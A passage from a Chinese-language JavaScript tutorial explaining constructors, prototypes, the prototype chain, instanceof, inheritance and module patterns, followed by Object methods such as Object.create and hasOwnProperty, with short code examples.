   JavaScript 通过构造函数生成新对象，因此构造函数可以视为对象的模板。实例对象的属性和方法，可以定义在构造函数内部。

   .. code:: javascript

      function Cat (name, color) {
        this.name = name;
        this.color = color;
      }
   
      var cat1 = new Cat('大毛', '白色');
   
      cat1.name // '大毛'
      cat1.color // '白色'

   上面代码中， ``Cat`` 函数是一个构造函数，函数内部定义了 ``name`` 属性和 ``color`` 属性，所有实例对象（上例是 ``cat1`` ）都会生成这两个属性，即这两个属性会定义在实例对象上面。

   通过构造函数为实例对象定义属性，虽然很方便，但是有一个缺点。同一个构造函数的多个实例之间，无法共享属性，从而造成对系统资源的浪费。

   .. code:: javascript

      function Cat(name, color) {
        this.name = name;
        this.color = color;
        this.meow = function () {
          console.log('喵喵');
        };
      }
   
      var cat1 = new Cat('大毛', '白色');
      var cat2 = new Cat('二毛', '黑色');
   
      cat1.meow === cat2.meow
      // false

   上面代码中， ``cat1`` 和 ``cat2`` 是同一个构造函数的两个实例，它们都具有 ``meow`` 方法。由于 ``meow`` 方法是生成在每个实例对象上面，所以两个实例就生成了两次。也就是说，每新建一个实例，就会新建一个 ``meow`` 方法。这既没有必要，又浪费系统资源，因为所有 ``meow`` 方法都是同样的行为，完全应该共享。

   这个问题的解决方法，就是 JavaScript 的原型对象（prototype）。

prototype 属性的作用
~~~~~~~~~~~~~~~~~~

   JavaScript 继承机制的设计思想就是，原型对象的所有属性和方法，都能被实例对象共享。也就是说，如果属性和方法定义在原型上，那么所有实例对象就能共享，不仅节省了内存，还体现了实例对象之间的联系。

   下面，先看怎么为对象指定原型。JavaScript 规定，每个函数都有一个 ``prototype`` 属性，指向一个对象。

   .. code:: javascript

      function f() {}
      typeof f.prototype // "object"

   上面代码中，函数 ``f`` 默认具有 ``prototype`` 属性，指向一个对象。

   对于普通函数来说，该属性基本无用。但是，对于构造函数来说，生成实例的时候，该属性会自动成为实例对象的原型。

   .. code:: javascript

      function Animal(name) {
        this.name = name;
      }
      Animal.prototype.color = 'white';
   
      var cat1 = new Animal('大毛');
      var cat2 = new Animal('二毛');
   
      cat1.color // 'white'
      cat2.color // 'white'

   上面代码中，构造函数 ``Animal`` 的 ``prototype`` 属性，就是实例对象 ``cat1`` 和 ``cat2`` 的原型对象。原型对象上添加一个 ``color`` 属性，结果，实例对象都共享了该属性。

   原型对象的属性不是实例对象自身的属性。只要修改原型对象，变动就立刻会体现在**所有**实例对象上。

   .. code:: javascript

      Animal.prototype.color = 'yellow';
   
      cat1.color // "yellow"
      cat2.color // "yellow"

   上面代码中，原型对象的 ``color`` 属性的值变为 ``yellow`` ，两个实例对象的 ``color`` 属性立刻跟着变了。这是因为实例对象其实没有 ``color`` 属性，都是读取原型对象的 ``color`` 属性。也就是说，当实例对象本身没有某个属性或方法的时候，它会到原型对象去寻找该属性或方法。这就是原型对象的特殊之处。

   如果实例对象自身就有某个属性或方法，它就不会再去原型对象寻找这个属性或方法。

   .. code:: javascript

      cat1.color = 'black';
   
      cat1.color // 'black'
      cat2.color // 'yellow'
      Animal.prototype.color // 'yellow';

   上面代码中，实例对象 ``cat1`` 的 ``color`` 属性改为 ``black`` ，就使得它不再去原型对象读取 ``color`` 属性，后者的值依然为 ``yellow`` 。

   总结一下，原型对象的作用，就是定义所有实例对象共享的属性和方法。这也是它被称为原型对象的原因，而实例对象可以视作从原型对象衍生出来的子对象。

   .. code:: javascript

      Animal.prototype.walk = function () {
        console.log(this.name + ' is walking');
      };

   上面代码中， ``Animal.prototype`` 对象上面定义了一个 ``walk`` 方法，这个方法将可以在所有 ``Animal`` 实例对象上面调用。

原型链
~~~~~

   JavaScript 规定，所有对象都有自己的原型对象（prototype）。一方面，任何一个对象，都可以充当其他对象的原型；另一方面，由于原型对象也是对象，所以它也有自己的原型。因此，就会形成一个“原型链”（prototype chain）：对象到原型，再到原型的原型……

   如果一层层地上溯，所有对象的原型最终都可以上溯到 ``Object.prototype`` ，即 ``Object`` 构造函数的 ``prototype`` 属性。也就是说，所有对象都继承了 ``Object.prototype`` 的属性。这就是所有对象都有 ``valueOf`` 和 ``toString`` 方法的原因，因为这是从 ``Object.prototype`` 继承的。

   那么， ``Object.prototype`` 对象有没有它的原型呢？回答是 ``Object.prototype`` 的原型是 ``null`` 。 ``null`` 没有任何属性和方法，也没有自己的原型。因此，原型链的尽头就是 ``null`` 。

   .. code:: javascript

      Object.getPrototypeOf(Object.prototype)
      // null

   上面代码表示， ``Object.prototype`` 对象的原型是 ``null`` ，由于 ``null`` 没有任何属性，所以原型链到此为止。 ``Object.getPrototypeOf`` 方法返回参数对象的原型，具体介绍请看后文。

   读取对象的某个属性时，JavaScript 引擎先寻找对象本身的属性，如果找不到，就到它的原型去找，如果还是找不到，就到原型的原型去找。如果直到最顶层的 ``Object.prototype`` 还是找不到，则返回 ``undefined`` 。如果对象自身和它的原型，都定义了一个同名属性，那么优先读取对象自身的属性，这叫做“覆盖”（overriding）。

   注意，一级级向上，在整个原型链上寻找某个属性，对性能是有影响的。所寻找的属性在越上层的原型对象，对性能的影响越大。如果寻找某个不存在的属性，将会遍历整个原型链。

   举例来说，如果让构造函数的 ``prototype`` 属性指向一个数组，就意味着实例对象可以调用数组方法。

   .. code:: javascript

      var MyArray = function () {};
   
      MyArray.prototype = new Array();
      MyArray.prototype.constructor = MyArray;
   
      var mine = new MyArray();
      mine.push(1, 2, 3);
      mine.length // 3
      mine instanceof Array // true

   上面代码中， ``mine`` 是构造函数 ``MyArray`` 的实例对象，由于 ``MyArray.prototype`` 指向一个数组实例，使得 ``mine`` 可以调用数组方法（这些方法定义在数组实例的 ``prototype`` 对象上面）。最后那行 ``instanceof`` 表达式，用来比较一个对象是否为某个构造函数的实例，结果就是证明 ``mine`` 为 ``Array`` 的实例， ``instanceof`` 运算符的详细解释详见后文。

   上面代码还出现了原型对象的 ``constructor`` 属性，这个属性的含义下一节就来解释。

constructor 属性
~~~~~~~~~~~~~~~

    ``prototype`` 对象有一个 ``constructor`` 属性，默认指向 ``prototype`` 对象所在的构造函数。

   .. code:: javascript

      function P() {}
      P.prototype.constructor === P // true

   由于 ``constructor`` 属性定义在 ``prototype`` 对象上面，意味着可以被所有实例对象继承。

   .. code:: javascript

      function P() {}
      var p = new P();
   
      p.constructor === P // true
      p.constructor === P.prototype.constructor // true
      p.hasOwnProperty('constructor') // false

   上面代码中， ``p`` 是构造函数 ``P`` 的实例对象，但是 ``p`` 自身没有 ``constructor`` 属性，该属性其实是读取原型链上面的 ``P.prototype.constructor`` 属性。

    ``constructor`` 属性的作用是，可以得知某个实例对象，到底是哪一个构造函数产生的。

   .. code:: javascript

      function F() {};
      var f = new F();
   
      f.constructor === F // true
      f.constructor === RegExp // false

   上面代码中， ``constructor`` 属性确定了实例对象 ``f`` 的构造函数是 ``F`` ，而不是 ``RegExp`` 。

   另一方面，有了 ``constructor`` 属性，就可以从一个实例对象新建另一个实例。

   .. code:: javascript

      function Constr() {}
      var x = new Constr();
   
      var y = new x.constructor();
      y instanceof Constr // true

   上面代码中， ``x`` 是构造函数 ``Constr`` 的实例，可以从 ``x.constructor`` 间接调用构造函数。这使得在实例方法中，调用自身的构造函数成为可能。

   .. code:: javascript

      Constr.prototype.createCopy = function () {
        return new this.constructor();
      };

   上面代码中， ``createCopy`` 方法调用构造函数，新建另一个实例。

    ``constructor`` 属性表示原型对象与构造函数之间的关联关系，如果修改了原型对象，一般会同时修改 ``constructor`` 属性，防止引用的时候出错。

   .. code:: javascript

      function Person(name) {
        this.name = name;
      }
   
      Person.prototype.constructor === Person // true
   
      Person.prototype = {
        method: function () {}
      };
   
      Person.prototype.constructor === Person // false
      Person.prototype.constructor === Object // true

   上面代码中，构造函数 ``Person`` 的原型对象改掉了，但是没有修改 ``constructor`` 属性，导致这个属性不再指向 ``Person`` 。由于 ``Person`` 的新原型是一个普通对象，而普通对象的 ``constructor`` 属性指向 ``Object`` 构造函数，导致 ``Person.prototype.constructor`` 变成了 ``Object`` 。

   所以，修改原型对象时，一般要同时修改 ``constructor`` 属性的指向。

   .. code:: javascript

      // 坏的写法
      C.prototype = {
        method1: function (...) { ... },
        // ...
      };
   
      // 好的写法
      C.prototype = {
        constructor: C,
        method1: function (...) { ... },
        // ...
      };
   
      // 更好的写法
      C.prototype.method1 = function (...) { ... };

   上面代码中，要么将 ``constructor`` 属性重新指向原来的构造函数，要么只在原型对象上添加方法，这样可以保证 ``instanceof`` 运算符不会失真。

   如果不能确定 ``constructor`` 属性是什么函数，还有一个办法：通过 ``name`` 属性，从实例得到构造函数的名称。

   .. code:: javascript

      function Foo() {}
      var f = new Foo();
      f.constructor.name // "Foo"

instanceof 运算符
----------------

    ``instanceof`` 运算符返回一个布尔值，表示对象是否为某个构造函数的实例。

   .. code:: javascript

      var v = new Vehicle();
      v instanceof Vehicle // true

   上面代码中，对象 ``v`` 是构造函数 ``Vehicle`` 的实例，所以返回 ``true`` 。

    ``instanceof`` 运算符的左边是实例对象，右边是构造函数。它会检查右边构造函数的原型对象（prototype），是否在左边对象的原型链上。因此，下面两种写法是等价的。

   .. code:: javascript

      v instanceof Vehicle
      // 等同于
      Vehicle.prototype.isPrototypeOf(v)

   上面代码中， ``Vehicle`` 是对象 ``v`` 的构造函数，它的原型对象是 ``Vehicle.prototype`` ， ``isPrototypeOf()`` 方法是 JavaScript 提供的原生方法，用于检查某个对象是否为另一个对象的原型，详细解释见后文。

   由于 ``instanceof`` 检查整个原型链，因此同一个实例对象，可能会对多个构造函数都返回 ``true`` 。

   .. code:: javascript

      var d = new Date();
      d instanceof Date // true
      d instanceof Object // true

   上面代码中， ``d`` 同时是 ``Date`` 和 ``Object`` 的实例，因此对这两个构造函数都返回 ``true`` 。

   由于任意对象（除了 ``null`` ）都是 ``Object`` 的实例，所以 ``instanceof`` 运算符可以判断一个值是否为非 ``null`` 的对象。

   .. code:: javascript

      var obj = { foo: 123 };
      obj instanceof Object // true
   
      null instanceof Object // false

   上面代码中，除了 ``null`` ，其他对象的 ``instanceOf Object`` 的运算结果都是 ``true`` 。

    ``instanceof`` 的原理是检查右边构造函数的 ``prototype`` 属性，是否在左边对象的原型链上。有一种特殊情况，就是左边对象的原型链上，只有 ``null`` 对象。这时， ``instanceof`` 判断会失真。

   .. code:: javascript

      var obj = Object.create(null);
      typeof obj // "object"
      obj instanceof Object // false

   上面代码中， ``Object.create(null)`` 返回一个新对象 ``obj`` ，它的原型是 ``null`` （ ``Object.create()`` 的详细介绍见后文）。右边的构造函数 ``Object`` 的 ``prototype`` 属性，不在左边的原型链上，因此 ``instanceof`` 就认为 ``obj`` 不是 ``Object`` 的实例。这是唯一的 ``instanceof`` 运算符判断会失真的情况（一个对象的原型是 ``null`` ）。

    ``instanceof`` 运算符的一个用处，是判断值的类型。

   .. code:: javascript

      var x = [1, 2, 3];
      var y = {};
      x instanceof Array // true
      y instanceof Object // true

   上面代码中， ``instanceof`` 运算符判断，变量 ``x`` 是数组，变量 ``y`` 是对象。

   注意， ``instanceof`` 运算符只能用于对象，不适用原始类型的值。

   .. code:: javascript

      var s = 'hello';
      s instanceof String // false

   上面代码中，字符串不是 ``String`` 对象的实例（因为字符串不是对象），所以返回 ``false`` 。

   此外，对于 ``undefined`` 和 ``null`` ， ``instanceof`` 运算符总是返回 ``false`` 。

   .. code:: javascript

      undefined instanceof Object // false
      null instanceof Object // false

   利用 ``instanceof`` 运算符，还可以巧妙地解决，调用构造函数时，忘了加 ``new`` 命令的问题。

   .. code:: javascript

      function Fubar (foo, bar) {
        if (this instanceof Fubar) {
          this._foo = foo;
          this._bar = bar;
        } else {
          return new Fubar(foo, bar);
        }
      }

   上面代码使用 ``instanceof`` 运算符，在函数体内部判断 ``this`` 关键字是否为构造函数 ``Fubar`` 的实例。如果不是，就表明忘了加 ``new`` 命令。

构造函数的继承
------------

   让一个构造函数继承另一个构造函数，是非常常见的需求。这可以分成两步实现。第一步是在子类的构造函数中，调用父类的构造函数。

   .. code:: javascript

      function Sub(value) {
        Super.call(this);
        this.prop = value;
      }

   上面代码中， ``Sub`` 是子类的构造函数， ``this`` 是子类的实例。在实例上调用父类的构造函数 ``Super`` ，就会让子类实例具有父类实例的属性。

   第二步，是让子类的原型指向父类的原型，这样子类就可以继承父类原型。

   .. code:: javascript

      Sub.prototype = Object.create(Super.prototype);
      Sub.prototype.constructor = Sub;
      Sub.prototype.method = '...';

   上面代码中， ``Sub.prototype`` 是子类的原型，要将它赋值为 ``Object.create(Super.prototype)`` ，而不是直接等于 ``Super.prototype`` 。否则后面两行对 ``Sub.prototype`` 的操作，会连父类的原型 ``Super.prototype`` 一起修改掉。

   另外一种写法是 ``Sub.prototype`` 等于一个父类实例。

   .. code:: javascript

      Sub.prototype = new Super();

   上面这种写法也有继承的效果，但是子类会具有父类实例的方法。有时，这可能不是我们需要的，所以不推荐使用这种写法。

   举例来说，下面是一个 ``Shape`` 构造函数。

   .. code:: javascript

      function Shape() {
        this.x = 0;
        this.y = 0;
      }
   
      Shape.prototype.move = function (x, y) {
        this.x += x;
        this.y += y;
        console.info('Shape moved.');
      };

   我们需要让 ``Rectangle`` 构造函数继承 ``Shape`` 。

   .. code:: javascript

      // 第一步，子类继承父类的实例
      function Rectangle() {
        Shape.call(this); // 调用父类构造函数
      }
      // 另一种写法
      function Rectangle() {
        this.base = Shape;
        this.base();
      }
   
      // 第二步，子类继承父类的原型
      Rectangle.prototype = Object.create(Shape.prototype);
      Rectangle.prototype.constructor = Rectangle;

   采用这样的写法以后， ``instanceof`` 运算符会对子类和父类的构造函数，都返回 ``true`` 。

   .. code:: javascript

      var rect = new Rectangle();
   
      rect instanceof Rectangle  // true
      rect instanceof Shape  // true

   上面代码中，子类是整体继承父类。有时只需要单个方法的继承，这时可以采用下面的写法。

   .. code:: javascript

      ClassB.prototype.print = function() {
        ClassA.prototype.print.call(this);
        // some code
      }

   上面代码中，子类 ``B`` 的 ``print`` 方法先调用父类 ``A`` 的 ``print`` 方法，再部署自己的代码。这就等于继承了父类 ``A`` 的 ``print`` 方法。

多重继承
-------

   JavaScript 不提供多重继承功能，即不允许一个对象同时继承多个对象。但是，可以通过变通方法，实现这个功能。

   .. code:: javascript

      function M1() {
        this.hello = 'hello';
      }
   
      function M2() {
        this.world = 'world';
      }
   
      function S() {
        M1.call(this);
        M2.call(this);
      }
   
      // 继承 M1
      S.prototype = Object.create(M1.prototype);
      // 继承链上加入 M2
      Object.assign(S.prototype, M2.prototype);
   
      // 指定构造函数
      S.prototype.constructor = S;
   
      var s = new S();
      s.hello // 'hello'
      s.world // 'world'

   上面代码中，子类 ``S`` 同时继承了父类 ``M1`` 和 ``M2`` 。这种模式又称为 Mixin（混入）。

模块
---

   随着网站逐渐变成“互联网应用程序”，嵌入网页的 JavaScript 代码越来越庞大，越来越复杂。网页越来越像桌面程序，需要一个团队分工协作、进度管理、单元测试等等……开发者必须使用软件工程的方法，管理网页的业务逻辑。

   JavaScript 模块化编程，已经成为一个迫切的需求。理想情况下，开发者只需要实现核心的业务逻辑，其他都可以加载别人已经写好的模块。

   但是，JavaScript 不是一种模块化编程语言，ES6 才开始支持“类”和“模块”。下面介绍传统的做法，如何利用对象实现模块的效果。

基本的实现方法
~~~~~~~~~~~~

   模块是实现特定功能的一组属性和方法的封装。

   简单的做法是把模块写成一个对象，所有的模块成员都放到这个对象里面。

   .. code:: javascript

      var module1 = new Object({
      　_count : 0,
      　m1 : function (){
      　　//...
      　},
      　m2 : function (){
        　//...
      　}
      });

   上面的函数 ``m1`` 和 ``m2`` ，都封装在 ``module1`` 对象里。使用的时候，就是调用这个对象的属性。

   .. code:: javascript

      module1.m1();

   但是，这样的写法会暴露所有模块成员，内部状态可以被外部改写。比如，外部代码可以直接改变内部计数器的值。

   .. code:: javascript

      module1._count = 5;

封装私有变量：构造函数的写法
~~~~~~~~~~~~~~~~~~~~~~~

   我们可以利用构造函数，封装私有变量。

   .. code:: javascript

      function StringBuilder() {
        var buffer = [];
   
        this.add = function (str) {
           buffer.push(str);
        };
   
        this.toString = function () {
          return buffer.join('');
        };
   
      }

   上面代码中， ``buffer`` 是模块的私有变量。一旦生成实例对象，外部是无法直接访问 ``buffer`` 的。但是，这种方法将私有变量封装在构造函数中，导致构造函数与实例对象是一体的，总是存在于内存之中，无法在使用完成后清除。这意味着，构造函数有双重作用，既用来塑造实例对象，又用来保存实例对象的数据，违背了构造函数与实例对象在数据上相分离的原则（即实例对象的数据，不应该保存在实例对象以外）。同时，非常耗费内存。

   .. code:: javascript

      function StringBuilder() {
        this._buffer = [];
      }
   
      StringBuilder.prototype = {
        constructor: StringBuilder,
        add: function (str) {
          this._buffer.push(str);
        },
        toString: function () {
          return this._buffer.join('');
        }
      };

   这种方法将私有变量放入实例对象中，好处是看上去更自然，但是它的私有变量可以从外部读写，不是很安全。

封装私有变量：立即执行函数的写法
~~~~~~~~~~~~~~~~~~~~~~~~~~

   另一种做法是使用“立即执行函数”（Immediately-Invoked Function Expression，IIFE），将相关的属性和方法封装在一个函数作用域里面，可以达到不暴露私有成员的目的。

   .. code:: javascript

      var module1 = (function () {
      　var _count = 0;
      　var m1 = function () {
      　  //...
      　};
      　var m2 = function () {
      　　//...
      　};
      　return {
      　　m1 : m1,
      　　m2 : m2
      　};
      })();

   使用上面的写法，外部代码无法读取内部的 ``_count`` 变量。

   .. code:: javascript

      console.info(module1._count); //undefined

   上面的 ``module1`` 就是 JavaScript 模块的基本写法。下面，再对这种写法进行加工。

模块的放大模式
~~~~~~~~~~~~

   如果一个模块很大，必须分成几个部分，或者一个模块需要继承另一个模块，这时就有必要采用“放大模式”（augmentation）。

   .. code:: javascript

      var module1 = (function (mod){
      　mod.m3 = function () {
      　　//...
      　};
      　return mod;
      })(module1);

   上面的代码为 ``module1`` 模块添加了一个新方法 ``m3()`` ，然后返回新的 ``module1`` 模块。

   在浏览器环境中，模块的各个部分通常都是从网上获取的，有时无法知道哪个部分会先加载。如果采用上面的写法，第一个执行的部分有可能加载一个不存在空对象，这时就要采用"宽放大模式"（Loose augmentation）。

   .. code:: javascript

      var module1 = (function (mod) {
      　//...
      　return mod;
      })(window.module1 || {});

   与"放大模式"相比，“宽放大模式”就是“立即执行函数”的参数可以是空对象。

输入全局变量
~~~~~~~~~~

   独立性是模块的重要特点，模块内部最好不与程序的其他部分直接交互。

   为了在模块内部调用全局变量，必须显式地将其他变量输入模块。

   .. code:: javascript

      var module1 = (function ($, YAHOO) {
      　//...
      })(jQuery, YAHOO);

   上面的 ``module1`` 模块需要使用 jQuery 库和 YUI 库，就把这两个库（其实是两个模块）当作参数输入 ``module1`` 。这样做除了保证模块的独立性，还使得模块之间的依赖关系变得明显。

   立即执行函数还可以起到命名空间的作用。

   .. code:: javascript

      (function($, window, document) {
   
        function go(num) {
        }
   
        function handleEvents() {
        }
   
        function initialize() {
        }
   
        function dieCarouselDie() {
        }
   
        //attach to the global scope
        window.finalCarousel = {
          init : initialize,
          destroy : dieCarouselDie
        }
   
      })( jQuery, window, document );

   上面代码中， ``finalCarousel`` 对象输出到全局，对外暴露 ``init`` 和 ``destroy`` 接口，内部方法 ``go`` 、 ``handleEvents`` 、 ``initialize`` 、 ``dieCarouselDie`` 都是外部无法调用的。

参考链接
-------

   - [JavaScript Modules: A Beginner’s Guide](https://www.freecodecamp.org/news/javascript-modules-a-beginner-s-guide-783f7d7a5fcc), by Preethi Kasireddy

/🟠 Object 对象的相关方法
=======================

   JavaScript 在 ``Object`` 对象上面，提供了很多相关方法，处理面向对象编程的相关操作。本章介绍这些方法。

Object.getPrototypeOf()
------------------------

    ``Object.getPrototypeOf`` 方法返回参数对象的原型。这是获取原型对象的标准方法。

   .. code:: javascript

      var F = function () {};
      var f = new F();
      Object.getPrototypeOf(f) === F.prototype // true

   上面代码中，实例对象 ``f`` 的原型是 ``F.prototype`` 。

   下面是几种特殊对象的原型。

   .. code:: javascript

      // 空对象的原型是 Object.prototype
      Object.getPrototypeOf({}) === Object.prototype // true
   
      // Object.prototype 的原型是 null
      Object.getPrototypeOf(Object.prototype) === null // true
   
      // 函数的原型是 Function.prototype
      function f() {}
      Object.getPrototypeOf(f) === Function.prototype // true

Object.setPrototypeOf()
------------------------

    ``Object.setPrototypeOf`` 方法为参数对象设置原型，返回该参数对象。它接受两个参数，第一个是现有对象，第二个是原型对象。

   .. code:: javascript

      var a = {};
      var b = {x: 1};
      Object.setPrototypeOf(a, b);
   
      Object.getPrototypeOf(a) === b // true
      a.x // 1

   上面代码中， ``Object.setPrototypeOf`` 方法将对象 ``a`` 的原型，设置为对象 ``b`` ，因此 ``a`` 可以共享 ``b`` 的属性。

    ``new`` 命令可以使用 ``Object.setPrototypeOf`` 方法模拟。

   .. code:: javascript

      var F = function () {
        this.foo = 'bar';
      };
   
      var f = new F();
      // 等同于
      var f = Object.setPrototypeOf({}, F.prototype);
      F.call(f);

   上面代码中， ``new`` 命令新建实例对象，其实可以分成两步。第一步，将一个空对象的原型设为构造函数的 ``prototype`` 属性（上例是 ``F.prototype`` ）；第二步，将构造函数内部的 ``this`` 绑定这个空对象，然后执行构造函数，使得定义在 ``this`` 上面的方法和属性（上例是 ``this.foo`` ），都转移到这个空对象上。

Object.create()
----------------

   生成实例对象的常用方法是，使用 ``new`` 命令让构造函数返回一个实例。但是很多时候，只能拿到一个实例对象，它可能根本不是由构建函数生成的，那么能不能从一个实例对象，生成另一个实例对象呢？

   JavaScript 提供了 ``Object.create()`` 方法，用来满足这种需求。该方法接受一个对象作为参数，然后以它为原型，返回一个实例对象。该实例完全继承原型对象的属性。

   .. code:: javascript

      // 原型对象
      var A = {
        print: function () {
          console.log('hello');
        }
      };
   
      // 实例对象
      var B = Object.create(A);
   
      Object.getPrototypeOf(B) === A // true
      B.print() // hello
      B.print === A.print // true

   上面代码中， ``Object.create()`` 方法以 ``A`` 对象为原型，生成了 ``B`` 对象。 ``B`` 继承了 ``A`` 的所有属性和方法。

   实际上， ``Object.create()`` 方法可以用下面的代码代替。

   .. code:: javascript

      if (typeof Object.create !== 'function') {
        Object.create = function (obj) {
          function F() {}
          F.prototype = obj;
          return new F();
        };
      }

   上面代码表明， ``Object.create()`` 方法的实质是新建一个空的构造函数 ``F`` ，然后让 ``F.prototype`` 属性指向参数对象 ``obj`` ，最后返回一个 ``F`` 的实例，从而实现让该实例继承 ``obj`` 的属性。

   下面三种方式生成的新对象是等价的。

   .. code:: javascript

      var obj1 = Object.create({});
      var obj2 = Object.create(Object.prototype);
      var obj3 = new Object();

   如果想要生成一个不继承任何属性（比如没有 ``toString()`` 和 ``valueOf()`` 方法）的对象，可以将 ``Object.create()`` 的参数设为 ``null`` 。

   .. code:: javascript

      var obj = Object.create(null);
   
      obj.valueOf()
      // TypeError: Object [object Object] has no method 'valueOf'

   上面代码中，对象 ``obj`` 的原型是 ``null`` ，它就不具备一些定义在 ``Object.prototype`` 对象上面的属性，比如 ``valueOf()`` 方法。

   使用 ``Object.create()`` 方法的时候，必须提供对象原型，即参数不能为空，或者不是对象，否则会报错。

   .. code:: javascript

      Object.create()
      // TypeError: Object prototype may only be an Object or null
      Object.create(123)
      // TypeError: Object prototype may only be an Object or null

    ``Object.create()`` 方法生成的新对象，动态继承了原型。在原型上添加或修改任何方法，会立刻反映在新对象之上。

   .. code:: javascript

      var obj1 = { p: 1 };
      var obj2 = Object.create(obj1);
   
      obj1.p = 2;
      obj2.p // 2

   上面代码中，修改对象原型 ``obj1`` 会影响到实例对象 ``obj2`` 。

   除了对象的原型， ``Object.create()`` 方法还可以接受第二个参数。该参数是一个属性描述对象，它所描述的对象属性，会添加到实例对象，作为该对象自身的属性。

   .. code:: javascript

      var obj = Object.create({}, {
        p1: {
          value: 123,
          enumerable: true,
          configurable: true,
          writable: true,
        },
        p2: {
          value: 'abc',
          enumerable: true,
          configurable: true,
          writable: true,
        }
      });
   
      // 等同于
      var obj = Object.create({});
      obj.p1 = 123;
      obj.p2 = 'abc';

    ``Object.create()`` 方法生成的对象，继承了它的原型对象的构造函数。

   .. code:: javascript

      function A() {}
      var a = new A();
      var b = Object.create(a);
   
      b.constructor === A // true
      b instanceof A // true

   上面代码中， ``b`` 对象的原型是 ``a`` 对象，因此继承了 ``a`` 对象的构造函数 ``A`` 。

Object.prototype.isPrototypeOf()
---------------------------------

   实例对象的 ``isPrototypeOf`` 方法，用来判断该对象是否为参数对象的原型。

   .. code:: javascript

      var o1 = {};
      var o2 = Object.create(o1);
      var o3 = Object.create(o2);
   
      o2.isPrototypeOf(o3) // true
      o1.isPrototypeOf(o3) // true

   上面代码中， ``o1`` 和 ``o2`` 都是 ``o3`` 的原型。这表明只要实例对象处在参数对象的原型链上， ``isPrototypeOf`` 方法都返回 ``true`` 。

   .. code:: javascript

      Object.prototype.isPrototypeOf({}) // true
      Object.prototype.isPrototypeOf([]) // true
      Object.prototype.isPrototypeOf(/xyz/) // true
      Object.prototype.isPrototypeOf(Object.create(null)) // false

   上面代码中，由于 ``Object.prototype`` 处于原型链的最顶端，所以对各种实例都返回 ``true`` ，只有直接继承自 ``null`` 的对象除外。

Object.prototype.\_\_proto\_\_
-------------------------------

   实例对象的 ``__proto__`` 属性（前后各两个下划线），返回该对象的原型。该属性可读写。

   .. code:: javascript

      var obj = {};
      var p = {};
   
      obj.__proto__ = p;
      Object.getPrototypeOf(obj) === p // true

   上面代码通过 ``__proto__`` 属性，将 ``p`` 对象设为 ``obj`` 对象的原型。

   根据语言标准， ``__proto__`` 属性只有浏览器才需要部署，其他环境可以没有这个属性。它前后的两根下划线，表明它本质是一个内部属性，不应该对使用者暴露。因此，应该尽量少用这个属性，而是用 ``Object.getPrototypeOf()`` 和 ``Object.setPrototypeOf()`` ，进行原型对象的读写操作。

   原型链可以用 ``__proto__`` 很直观地表示。

   .. code:: javascript

      var A = {
        name: '张三'
      };
      var B = {
        name: '李四'
      };
   
      var proto = {
        print: function () {
          console.log(this.name);
        }
      };
   
      A.__proto__ = proto;
      B.__proto__ = proto;
   
      A.print() // 张三
      B.print() // 李四
   
      A.print === B.print // true
      A.print === proto.print // true
      B.print === proto.print // true

   上面代码中， ``A`` 对象和 ``B`` 对象的原型都是 ``proto`` 对象，它们都共享 ``proto`` 对象的 ``print`` 方法。也就是说， ``A`` 和 ``B`` 的 ``print`` 方法，都是在调用 ``proto`` 对象的 ``print`` 方法。

获取原型对象方法的比较
------------------

   如前所述， ``__proto__`` 属性指向当前对象的原型对象，即构造函数的 ``prototype`` 属性。

   .. code:: javascript

      var obj = new Object();
   
      obj.__proto__ === Object.prototype
      // true
      obj.__proto__ === obj.constructor.prototype
      // true

   上面代码首先新建了一个对象 ``obj`` ，它的 ``__proto__`` 属性，指向构造函数（ ``Object`` 或 ``obj.constructor`` ）的 ``prototype`` 属性。

   因此，获取实例对象 ``obj`` 的原型对象，有三种方法。

   -  ``obj.__proto__`` 
   -  ``obj.constructor.prototype`` 
   -  ``Object.getPrototypeOf(obj)`` 

   上面三种方法之中，前两种都不是很可靠。 ``__proto__`` 属性只有浏览器才需要部署，其他环境可以不部署。而 ``obj.constructor.prototype`` 在手动改变原型对象时，可能会失效。

   .. code:: javascript

      var P = function () {};
      var p = new P();
   
      var C = function () {};
      C.prototype = p;
      var c = new C();
   
      c.constructor.prototype === p // false

   上面代码中，构造函数 ``C`` 的原型对象被改成了 ``p`` ，但是实例对象的 ``c.constructor.prototype`` 却没有指向 ``p`` 。所以，在改变原型对象时，一般要同时设置 ``constructor`` 属性。

   .. code:: javascript

      C.prototype = p;
      C.prototype.constructor = C;
   
      var c = new C();
      c.constructor.prototype === p // true

   因此，推荐使用第三种 ``Object.getPrototypeOf`` 方法，获取原型对象。

Object.getOwnPropertyNames()
-----------------------------

    ``Object.getOwnPropertyNames`` 方法返回一个数组，成员是参数对象本身的所有属性的键名，不包含继承的属性键名。

   .. code:: javascript

      Object.getOwnPropertyNames(Date)
      // ["parse", "arguments", "UTC", "caller", "name", "prototype", "now", "length"]

   上面代码中， ``Object.getOwnPropertyNames`` 方法返回 ``Date`` 所有自身的属性名。

   对象本身的属性之中，有的是可以遍历的（enumerable），有的是不可以遍历的。 ``Object.getOwnPropertyNames`` 方法返回所有键名，不管是否可以遍历。只获取那些可以遍历的属性，使用 ``Object.keys`` 方法。

   .. code:: javascript

      Object.keys(Date) // []

   上面代码表明， ``Date`` 对象所有自身的属性，都是不可以遍历的。

Object.prototype.hasOwnProperty()
----------------------------------

   对象实例的 ``hasOwnProperty`` 方法返回一个布尔值，用于判断某个属性定义在对象自身，还是定义在原型链上。

   .. code:: javascript

      Date.hasOwnProperty('length') // true
      Date.hasOwnProperty('toString') // false

   上面代码表明， ``Date.length`` （构造函数 ``Date`` 可以接受多少个参数）是 ``Date`` 自身的属性， ``Date.toString`` 是继承的属性。

   另外， ``hasOwnProperty`` 方法是 JavaScript 之中唯一一个处理对象属性时，不会遍历原型链的方法。

in 运算符和 for...in 循环
-----------------------

    ``in`` 运算符返回一个布尔值，表示一个对象是否具有某个属性。它不区分该属性是对象自身的属性，还是继承的属性。

   .. code:: javascript

      'length' in Date // true
      'toString' in Date // true

    ``in`` 运算符常用于检查一个属性是否存在。

   获得对象的所有可遍历属性（不管是自身的还是继承的），可以使用 ``for...in`` 循环。

   .. code:: javascript

      var o1 = { p1: 123 };
   
      var o2 = Object.create(o1, {
        p2: { value: "abc", enumerable: true }
      });
   
      for (p in o2) {
        console.info(p);
      }
      // p2
      // p1

   上面代码中，对象 ``o2`` 的 ``p2`` 属性是自身的， ``p1`` 属性是继承的。这两个属性都会被 ``for...in`` 循环遍历。

   为了在 ``for...in`` 循环中获得对象自身的属性，可以采用 ``hasOwnProperty`` 方法判断一下。

   .. code:: javascript

      for ( var name in object ) {
        if ( object.hasOwnProperty(name) ) {
          /* loop code */
        }
